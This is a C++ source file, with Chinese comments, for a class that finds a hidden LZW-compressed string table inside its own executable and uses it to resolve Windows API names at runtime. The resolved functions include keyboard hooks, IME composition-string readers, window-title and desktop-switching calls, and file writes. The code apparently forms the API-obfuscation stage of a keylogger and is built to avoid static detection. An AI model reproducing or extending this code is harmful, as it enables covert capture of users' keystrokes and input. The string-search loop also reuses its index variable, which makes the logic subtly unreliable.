#include "stdafx.h"
#include "MyFunc.h"
#include "Lzw.h"

CMyFunc::CMyFunc()
{
	hModule_Kernel32 = NULL;
	hModule_Psapi = NULL;
	hModule_MSVCRT = NULL;
	hModule_User32 = NULL;
	hModule_ADVAPI32 = NULL;
	hModule_IMM32 = NULL;

	pModuleString = NULL;
	nModuleStringLen = 0;
}

CMyFunc::~CMyFunc()
{
	if(hModule_Kernel32 != NULL)
	{
		FreeLibrary(hModule_Kernel32);
	}
	if(hModule_Psapi != NULL)
	{
		FreeLibrary(hModule_Psapi);
	}

	if(hModule_MSVCRT != NULL)
	{
		FreeLibrary(hModule_MSVCRT);
	}
	if(hModule_User32 != NULL)
	{
		FreeLibrary(hModule_User32);
	}
	if(hModule_ADVAPI32 != NULL)
	{
		FreeLibrary(hModule_ADVAPI32);
	}
	if(hModule_IMM32 != NULL)
	{
		FreeLibrary(hModule_IMM32);
	}
	if(pModuleString != NULL)
	{
		delete [] pModuleString;
	}
}

int inline CMyFunc::GetMySprintf(int nValue, char* pOutStr)
{
	for(int i = 4; i >= 0; i--)
	{
		pOutStr[i] = 0x30 + nValue % 10;
		nValue = nValue / 10;
	}
	return i;
}

inline BOOL CMyFunc::DoMyMemCmp(char* pSrc, char* pDes, int len)
{
	for(int i = 0; i < len; i++)
	{
		if(pSrc[i] != pDes[i])
		{
			return FALSE;
		}
	}
	return TRUE;
}

inline void  CMyFunc::DoMyMemCpy(char* pSrc, char* pDes, int len)
{
	for(int i = 0; i < len; i++)
	{
		pSrc[i] = pDes[i];
	}
}

inline void CMyFunc::GetMyString(DWORD nIndex, char* pOutString, char* pInString, DWORD nInStringLen)
{
	//查看
	if(pInString == NULL || nInStringLen == 0 || nIndex < 10001 || nIndex > 19999)
	{
		_asm int 3;
		return;
	}
	
	char m_FindStr[256] = {0};
	m_FindStr[0] = 'P';
	m_FindStr[1] = 'S';
	m_FindStr[2] = '_';
	GetMySprintf(nIndex, m_FindStr + 3);
	m_FindStr[8] = '=';
	
	for(DWORD i = 0; i < nInStringLen; i++)
	{
		if(DoMyMemCmp(&pInString[i], m_FindStr, 9))
		{
			//找到开始
			char* pStart = &pInString[i] + 9;
			for(i = 0; i < nInStringLen - i - 9; i++)
			{
				if(pStart[i] == '\r')
				{
					DoMyMemCpy(pOutString, pStart, i);
					pOutString[i] = 0;
					return;
				}
			}
		}
	}

	_asm int 3;
}

BOOL CMyFunc::LoadMyData(BYTE* pModuel)
{
	if(pModuleString != NULL)
	{
		return TRUE;
	}

	// PE头偏移
	DWORD dwPE_Header_OffSet = *(DWORD *)(pModuel + 0x3C);
	
	// 取得 PE 头
	IMAGE_NT_HEADERS *pPE_Header = (IMAGE_NT_HEADERS *)(pModuel + dwPE_Header_OffSet);

	//取字串资源偏移量
	LPPSSAVEFILEINFO pSaveFileInfo = NULL;
	BYTE* pTmpData = pModuel;
	for(DWORD i = 0; i < pPE_Header->OptionalHeader.SizeOfImage - sizeof(ULONGLONG); i++)
	{
		if(*((ULONGLONG*) &pTmpData[i]) == PS_FIND_FLAG)
		{	
			pSaveFileInfo = (LPPSSAVEFILEINFO) &pTmpData[i];
			break;
		}
	}
	if(pSaveFileInfo == NULL)
	{
		return FALSE;
	}

//	_asm int 3;

	BYTE* pTmpStr = NULL;

	//开辟字串存储缓冲
	FCLzw lzw;
	lzw.PcUnZip(((BYTE*) pSaveFileInfo) + sizeof(PSSAVEFILEINFO), &pTmpStr, &nModuleStringLen);
	pModuleString = (char*) pTmpStr;

	//开始赋值函数指针
	char m_MyString[512] = {0};

//IMM32.dll
	GetMyString(10011, m_MyString, pModuleString, nModuleStringLen);	
	hModule_IMM32 = LoadLibrary(m_MyString);

	//ImmReleaseContext
	GetMyString(10012, m_MyString, pModuleString, nModuleStringLen);
	ImmReleaseContext = (MyImmReleaseContext) GetProcAddress(hModule_IMM32, m_MyString);

	//ImmGetCompositionStringW
	GetMyString(10013, m_MyString, pModuleString, nModuleStringLen);
	ImmGetCompositionStringW = (MyImmGetCompositionStringW) GetProcAddress(hModule_IMM32, m_MyString);

	//ImmGetCompositionStringA
	GetMyString(10014, m_MyString, pModuleString, nModuleStringLen);
	ImmGetCompositionString = (MyImmGetCompositionStringA) GetProcAddress(hModule_IMM32, m_MyString);

	//ImmGetContext
	GetMyString(10015, m_MyString, pModuleString, nModuleStringLen);
	ImmGetContext = (MyImmGetContext) GetProcAddress(hModule_IMM32, m_MyString);

//ADVAPI32.dll
	GetMyString(10016, m_MyString, pModuleString, nModuleStringLen);
	hModule_ADVAPI32 = LoadLibrary(m_MyString);

	//GetUserNameW
	GetMyString(10017, m_MyString, pModuleString, nModuleStringLen);
	GetUserNameW = (MyGetUserNameW) GetProcAddress(hModule_ADVAPI32, m_MyString);

//User32.dll
	GetMyString(10037, m_MyString, pModuleString, nModuleStringLen);
	hModule_User32 = LoadLibrary(m_MyString);

	//wsprintfW
	GetMyString(10039, m_MyString, pModuleString, nModuleStringLen);
	wsprintfW = (MywsprintfW) GetProcAddress(hModule_User32, m_MyString);

	//CharLowerA
	GetMyString(10040, m_MyString, pModuleString, nModuleStringLen);
	CharLower = (MyCharLowerA) GetProcAddress(hModule_User32, m_MyString);

	//CallNextHookEx
	GetMyString(10043, m_MyString, pModuleString, nModuleStringLen);
	CallNextHookEx = (MyCallNextHookEx) GetProcAddress(hModule_User32, m_MyString);

	//GetForegroundWindow
	GetMyString(10044, m_MyString, pModuleString, nModuleStringLen);
	GetForegroundWindow = (MyGetForegroundWindow) GetProcAddress(hModule_User32, m_MyString);

	//GetWindowTextA
	GetMyString(10045, m_MyString, pModuleString, nModuleStringLen);
	GetWindowText = (MyGetWindowTextA) GetProcAddress(hModule_User32, m_MyString);

	//GetWindowThreadProcessId
	GetMyString(10046, m_MyString, pModuleString, nModuleStringLen);
	GetWindowThreadProcessId = (MyGetWindowThreadProcessId) GetProcAddress(hModule_User32, m_MyString);

	//GetActiveWindow
	GetMyString(10047, m_MyString, pModuleString, nModuleStringLen);
	GetActiveWindow = (MyGetActiveWindow) GetProcAddress(hModule_User32, m_MyString);

	//UnhookWindowsHookEx
	GetMyString(10048, m_MyString, pModuleString, nModuleStringLen);
	UnhookWindowsHookEx = (MyUnhookWindowsHookEx) GetProcAddress(hModule_User32, m_MyString);

	//SetWindowsHookExW
	GetMyString(10049, m_MyString, pModuleString, nModuleStringLen);
	SetWindowsHookExW = (MySetWindowsHookExW) GetProcAddress(hModule_User32, m_MyString);

	//SetThreadDesktop
	GetMyString(10050, m_MyString, pModuleString, nModuleStringLen);
	SetThreadDesktop = (MySetThreadDesktop) GetProcAddress(hModule_User32, m_MyString);

	//OpenDesktopA
	GetMyString(10051, m_MyString, pModuleString, nModuleStringLen);
	OpenDesktop = (MyOpenDesktopA) GetProcAddress(hModule_User32, m_MyString);

	//GetThreadDesktop
	GetMyString(10052, m_MyString, pModuleString, nModuleStringLen);
	GetThreadDesktop = (MyGetThreadDesktop) GetProcAddress(hModule_User32, m_MyString);

//Kernel32.dll
	GetMyString(10053, m_MyString, pModuleString, nModuleStringLen);
	hModule_Kernel32 = LoadLibrary(m_MyString);

	//CreateMutexA
	GetMyString(10056, m_MyString, pModuleString, nModuleStringLen);
	CreateMutex = (MyCreateMutexA) GetProcAddress(hModule_Kernel32, m_MyString);

	//OpenMutexA
	GetMyString(10057, m_MyString, pModuleString, nModuleStringLen);
	OpenMutex = (MyOpenMutexA) GetProcAddress(hModule_Kernel32, m_MyString);

	//ReleaseMutex
	GetMyString(10058, m_MyString, pModuleString, nModuleStringLen);
	ReleaseMutex = (MyReleaseMutex) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateEventA
	GetMyString(10059, m_MyString, pModuleString, nModuleStringLen);
	CreateEvent = (MyCreateEventA) GetProcAddress(hModule_Kernel32, m_MyString);

	//OpenEventA
	GetMyString(10060, m_MyString, pModuleString, nModuleStringLen);
	OpenEvent = (MyOpenEventA) GetProcAddress(hModule_Kernel32, m_MyString);

	//SetEvent
	GetMyString(10061, m_MyString, pModuleString, nModuleStringLen);
	SetEvent = (MySetEvent) GetProcAddress(hModule_Kernel32, m_MyString);

	//WaitForSingleObject
	GetMyString(10062, m_MyString, pModuleString, nModuleStringLen);
	WaitForSingleObject = (MyWaitForSingleObject) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetLocalTime
	GetMyString(10063, m_MyString, pModuleString, nModuleStringLen);
	GetLocalTime = (MyGetLocalTime) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetTickCount
	GetMyString(10064, m_MyString, pModuleString, nModuleStringLen);
	GetTickCount = (MyGetTickCount) GetProcAddress(hModule_Kernel32, m_MyString);

	//lstrcpyW
	GetMyString(10065, m_MyString, pModuleString, nModuleStringLen);
	lstrcpyW = (MylstrcpyW) GetProcAddress(hModule_Kernel32, m_MyString);

	//lstrcatW
	GetMyString(10066, m_MyString, pModuleString, nModuleStringLen);
	lstrcatW = (MylstrcatW) GetProcAddress(hModule_Kernel32, m_MyString);

	//lstrlenW
	GetMyString(10067, m_MyString, pModuleString, nModuleStringLen);
	lstrlenW = (MylstrlenW) GetProcAddress(hModule_Kernel32, m_MyString);

	//lstrcmpW
	GetMyString(10068, m_MyString, pModuleString, nModuleStringLen);
	lstrcmpW = (MylstrcmpW) GetProcAddress(hModule_Kernel32, m_MyString);

	//OpenProcess
	GetMyString(10072, m_MyString, pModuleString, nModuleStringLen);
	OpenProcess = (MyOpenProcess) GetProcAddress(hModule_Kernel32, m_MyString);

	//MultiByteToWideChar
	GetMyString(10073, m_MyString, pModuleString, nModuleStringLen);
	MultiByteToWideChar = (MyMultiByteToWideChar) GetProcAddress(hModule_Kernel32, m_MyString);

	//WideCharToMultiByte
	GetMyString(10074, m_MyString, pModuleString, nModuleStringLen);
	WideCharToMultiByte = (MyWideCharToMultiByte) GetProcAddress(hModule_Kernel32, m_MyString);

	//CreateFileA
	GetMyString(10076, m_MyString, pModuleString, nModuleStringLen);
	CreateFile = (MyCreateFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//WriteFile
	GetMyString(10078, m_MyString, pModuleString, nModuleStringLen);
	WriteFile = (MyWriteFile) GetProcAddress(hModule_Kernel32, m_MyString);

	//DeleteFileA
	GetMyString(10077, m_MyString, pModuleString, nModuleStringLen);
	DeleteFile = (MyDeleteFileA) GetProcAddress(hModule_Kernel32, m_MyString);

	//SetFilePointer
	GetMyString(10081, m_MyString, pModuleString, nModuleStringLen);
	SetFilePointer = (MySetFilePointer) GetProcAddress(hModule_Kernel32, m_MyString);

	//CloseHandle
	GetMyString(10082, m_MyString, pModuleString, nModuleStringLen);
	CloseHandle = (MyCloseHandle) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetModuleFileNameA
	GetMyString(10083, m_MyString, pModuleString, nModuleStringLen);
	GetModuleFileName = (MyGetModuleFileNameA) GetProcAddress(hModule_Kernel32, m_MyString);

	//GetCurrentThreadId
	GetMyString(10086, m_MyString, pModuleString, nModuleStringLen);
	GetCurrentThreadId = (MyGetCurrentThreadId) GetProcAddress(hModule_Kernel32, m_MyString);

//Psapi.dll
	GetMyString(10089, m_MyString, pModuleString, nModuleStringLen);
	hModule_Psapi = LoadLibrary(m_MyString);

	//GetModuleFileNameExA
	GetMyString(10090, m_MyString, pModuleString, nModuleStringLen);
	GetModuleFileNameEx = (MyGetModuleFileNameExA) GetProcAddress(hModule_Psapi, m_MyString);

//MSVCRT.dll
	GetMyString(10104, m_MyString, pModuleString, nModuleStringLen);
	hModule_MSVCRT = LoadLibrary(m_MyString);

	//sprintf
	GetMyString(10105, m_MyString, pModuleString, nModuleStringLen);
	sprintf = (Mysprintf) GetProcAddress(hModule_MSVCRT, m_MyString);

	//memcpy
	GetMyString(10107, m_MyString, pModuleString, nModuleStringLen);
	memcpy = (Mymemcpy) GetProcAddress(hModule_MSVCRT, m_MyString);

	//memset
	GetMyString(10103, m_MyString, pModuleString, nModuleStringLen);
	memset = (Mymemset) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strstr
	GetMyString(10092, m_MyString, pModuleString, nModuleStringLen);
	strstr = (Mystrstr) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strcat
	GetMyString(10094, m_MyString, pModuleString, nModuleStringLen);
	strcat = (Mystrcat) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strrchr
	GetMyString(10099, m_MyString, pModuleString, nModuleStringLen);
	strrchr = (Mystrrchr) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strlen
	GetMyString(10100, m_MyString, pModuleString, nModuleStringLen);
	strlen = (Mystrlen) GetProcAddress(hModule_MSVCRT, m_MyString);

	//strcpy
	GetMyString(10101, m_MyString, pModuleString, nModuleStringLen);
	strcpy = (Mystrcpy) GetProcAddress(hModule_MSVCRT, m_MyString);

	return TRUE;
}